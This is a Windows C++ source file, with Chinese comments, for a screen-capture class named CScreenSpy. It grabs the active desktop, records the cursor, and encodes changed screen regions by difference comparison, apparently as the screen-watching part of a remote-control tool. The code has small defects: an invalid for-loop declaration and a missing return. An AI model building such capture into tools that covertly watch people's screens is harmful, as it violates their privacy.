// ScreenSpy.cpp: implementation of the ScreenSpy class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenSpy.h"
#include "Common.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)
CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)   //*
{
	switch (biBitCount)
	{
	case 1:
	case 4:
	case 8:
	case 16:
	case 32:
		m_biBitCount = biBitCount;
		break;
	default:
		m_biBitCount = 8;
	}
	
	if (!SelectInputWinStation())          //获得用户的当前工作区
	{
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}


	m_dwBitBltRop	= SRCCOPY;        //直接复制过来，不拉伸，不压缩，跟原来一模一样的大小
	
	m_bAlgorithm	= ALGORITHM_DIFF; // 默认使用差异扫描算法
	m_dwLastCapture	= GetTickCount();
	m_nMaxFrameRate	= nMaxFrameRate;
	m_dwSleep		= 1000 / nMaxFrameRate;
	m_bIsGray		= bIsGray;

    m_nIncSize		= 32 / m_biBitCount;

	m_nFullWidth	= ::GetSystemMetrics(SM_CXSCREEN);    //屏幕的分辨率
    m_nFullHeight	= ::GetSystemMetrics(SM_CYSCREEN);


	m_nStartLine	= 0;
	
	m_hFullMemDC	= ::CreateCompatibleDC(m_hFullDC);      //为主屏幕DC创建一个内存DC
	m_hDiffMemDC	= ::CreateCompatibleDC(m_hFullDC);
	m_hLineMemDC	= ::CreateCompatibleDC(NULL);
	m_hRectMemDC	= ::CreateCompatibleDC(NULL);
	m_lpvLineBits	= NULL;
	m_lpvFullBits	= NULL;
	

	
	 //为主屏幕创建一个BitMapInfor
	m_lpbmi_line	= ConstructBI(m_biBitCount, m_nFullWidth, 1);
	m_lpbmi_full	= ConstructBI(m_biBitCount, m_nFullWidth, m_nFullHeight); 
	m_lpbmi_rect	= ConstructBI(m_biBitCount, m_nFullWidth, 1);


	//创建 应用程序可以直接写入的与设备无关的位图（ DIB）
	m_hLineBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_line, 
		DIB_RGB_COLORS, &m_lpvLineBits, NULL, NULL);
	m_hFullBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, 
		DIB_RGB_COLORS, &m_lpvFullBits, NULL, NULL);
	m_hDiffBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, 
		DIB_RGB_COLORS, &m_lpvDiffBits, NULL, NULL);

	
 
	//将位图句柄指定内存设备上下文环境中
	::SelectObject(m_hFullMemDC, m_hFullBitmap);
	::SelectObject(m_hLineMemDC, m_hLineBitmap);
	::SelectObject(m_hDiffMemDC, m_hDiffBitmap);
	

	//使用坐标来确定矩形的区域并得到该区域的句柄
	::SetRect(&m_changeRect, 0, 0, m_nFullWidth, m_nFullHeight);
	
	//申请足够的内存
	m_rectBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
	m_nDataSizePerLine = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;  //每行
	
	m_rectBufferOffset = 0;



}


bool CScreenSpy::SelectInputWinStation()
{
	bool bRet = SwitchInputDesktop();   //当前
	if (bRet)
	{
		ReleaseDC(m_hDeskTopWnd, m_hFullDC);
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}	
	return bRet;	
}





LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
{
/*
biBitCount 为1 (黑白二色图) 、4 (16 色图) 、8 (256 色图) 时由颜色表项数指出颜色表大小
biBitCount 为16 (16 位色图) 、24 (真彩色图, 不支持) 、32 (32 位色图) 时没有颜色表
	*/
	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
	
	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));   //BITMAPINFOHEADER +　调色板的个数
	BITMAPINFO	*lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	
	BITMAPINFOHEADER	*lpbmih = &(lpbmi->bmiHeader);
	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
	lpbmih->biWidth = biWidth;
	lpbmih->biHeight = biHeight;
	lpbmih->biPlanes = 1;
	lpbmih->biBitCount = biBitCount;
	lpbmih->biCompression = BI_RGB;
	lpbmih->biXPelsPerMeter = 0;
	lpbmih->biYPelsPerMeter = 0;
	lpbmih->biClrUsed = 0;
	lpbmih->biClrImportant = 0;
	lpbmih->biSizeImage = 
		((lpbmih->biWidth * lpbmih->biBitCount + 31)/32)*4* lpbmih->biHeight;
	
	// 16位和以后的没有颜色表，直接返回
	if (biBitCount >= 16)
		return lpbmi;
	/*
	Windows 95和Windows 98：如果lpvBits参数为NULL并且GetDIBits成功地填充了BITMAPINFO结构，那么返回值为位图中总共的扫描线数。
	
    Windows NT：如果lpvBits参数为NULL并且GetDIBits成功地填充了BITMAPINFO结构，那么返回值为非0。如果函数执行失败，那么将返回0值。Windows NT：若想获得更多错误信息，请调用callGetLastError函数。
	*/
  
	HDC	hDC = GetDC(NULL);  //取得整个屏幕的设备描述表句柄

	HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // 高宽不能为0
	//创建与指定的设备环境相关的设备兼容的位图
	
	GetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS); 
	//检取指定位图的信息，并将其以指定格式复制到一个缓冲区中
	ReleaseDC(NULL, hDC);
	DeleteObject(hBmp);

	if (m_bIsGray)
	{
		for (int i = 0; i < color_num; i++)
		{
			int color = RGB2GRAY(lpbmi->bmiColors[i].rgbRed, 
				lpbmi->bmiColors[i].rgbGreen, lpbmi->bmiColors[i].rgbBlue);
			lpbmi->bmiColors[i].rgbRed = lpbmi->bmiColors[i].rgbGreen = 
				lpbmi->bmiColors[i].rgbBlue = color;
		}
	}

	return lpbmi;	
}



LPVOID CScreenSpy::getFirstScreen()
{
	//用于从原设备中复制位图到目标设备
	::BitBlt(m_hFullMemDC, 0, 0, m_nFullWidth, 
		m_nFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
	return m_lpvFullBits;
}

UINT CScreenSpy::getBISize()
{
	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;
	
	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
}

LPBITMAPINFO CScreenSpy::getBI()
{
	return m_lpbmi_full;
}

UINT CScreenSpy::getFirstImageSize()
{
	return m_lpbmi_full->bmiHeader.biSizeImage;
}


LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
{
	if (lpdwBytes == NULL || m_rectBuffer == NULL)
		return NULL;
	
	SelectInputWinStation();   
	
	// 重置rect缓冲区指针
	m_rectBufferOffset = 0;
	
	// 写入使用了哪种算法
	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));
	
	// 写入光标位置
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));
	
	// 写入当前光标类型
	BYTE	bCursorIndex = m_CursorInfo.getCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));
	
	// 差异比较算法
	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// 分段扫描全屏幕  将新的位图放入到m_hDiffMemDC中
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_lpbmi_full->bmiHeader.biWidth,
			m_lpbmi_full->bmiHeader.biHeight);
	
		//FullMem   FullDc   m_hDiffMemDC
		
		//两个Bit进行比较如果不一样修改m_lpvFullBits中的返回
		*lpdwBytes = m_rectBufferOffset + 
			Compare((LPBYTE)m_lpvDiffBits, (LPBYTE)m_lpvFullBits,
			m_rectBuffer + m_rectBufferOffset, m_lpbmi_full->bmiHeader.biSizeImage);

		
	
		return m_rectBuffer;
	}
	

	//在这里可以使用其他算法
}


void CScreenSpy::ScanScreen( HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight)
{
	UINT	nJumpLine = 50;
	UINT	nJumpSleep = nJumpLine / 10; // 扫描间隔
	// 扫描屏幕
	for (int i = 0, int	nToJump = 0; i < nHeight; i += nToJump)
	{
		int	nOther = nHeight - i;
		
		if (nOther > nJumpLine)
			nToJump = nJumpLine;
		else
			nToJump = nOther;   //49  50


		BitBlt(hdcDest, 0, i, nWidth, nToJump, hdcSrc,	0, i, m_dwBitBltRop);
		Sleep(nJumpSleep);
	}
}

// 差异比较算法块的函数
int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize )
{
	// Windows规定一个扫描行所占的字节数必须是4的倍数, 所以用DWORD比较
	LPDWORD	p1, p2;
	p1 = (LPDWORD)lpDest;
	p2 = (LPDWORD)lpSource;
	
	// 偏移的偏移，不同长度的偏移
	int	nOffsetOffset = 0, nBytesOffset = 0, nDataOffset = 0;
	int nCount = 0; // 数据计数器
	// p1++实际上是递增了一个DWORD
	for (int i = 0; i < dwSize; i += 4, p1++, p2++)
	{
		if (*p1 == *p2)
			continue;
		// 一个新数据块开始
		// 写入偏移地址
		*(LPDWORD)(lpBuffer + nOffsetOffset) = i;
		// 记录数据大小的存放位置
		nBytesOffset = nOffsetOffset + sizeof(int);
		nDataOffset = nBytesOffset + sizeof(int);
		nCount = 0; // 数据计数器归零
		
		// 更新Dest中的数据
		*p1 = *p2;
		*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
		
		nCount += 4;
		i += 4, p1++, p2++;
		
		for (int j = i; j < dwSize; j += 4, i += 4, p1++, p2++)
		{
			if (*p1 == *p2)
				break;
			
			// 更新Dest中的数据
			*p1 = *p2;
			*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
			nCount += 4;
		}
		// 写入数据长度
		*(LPDWORD)(lpBuffer + nBytesOffset) = nCount;
		nOffsetOffset = nDataOffset + nCount;	
	}
	
	// nOffsetOffset 就是写入的总大小
	return nOffsetOffset;
}


void CScreenSpy::WriteRectBuffer(LPBYTE	lpData, int nCount)
{
	memcpy(m_rectBuffer + m_rectBufferOffset, lpData, nCount);
	m_rectBufferOffset += nCount;
}



CScreenSpy::~CScreenSpy()
{
	::ReleaseDC(m_hDeskTopWnd, m_hFullDC);
	::DeleteDC(m_hLineMemDC);
	::DeleteDC(m_hFullMemDC);
	::DeleteDC(m_hRectMemDC);
	::DeleteDC(m_hDiffMemDC);
	
	::DeleteObject(m_hLineBitmap);
	::DeleteObject(m_hFullBitmap);
	::DeleteObject(m_hDiffBitmap);
	
	if (m_rectBuffer)
		delete[] m_rectBuffer;
	delete[]	m_lpbmi_full;
	delete[]	m_lpbmi_line;
	delete[]	m_lpbmi_rect;
}



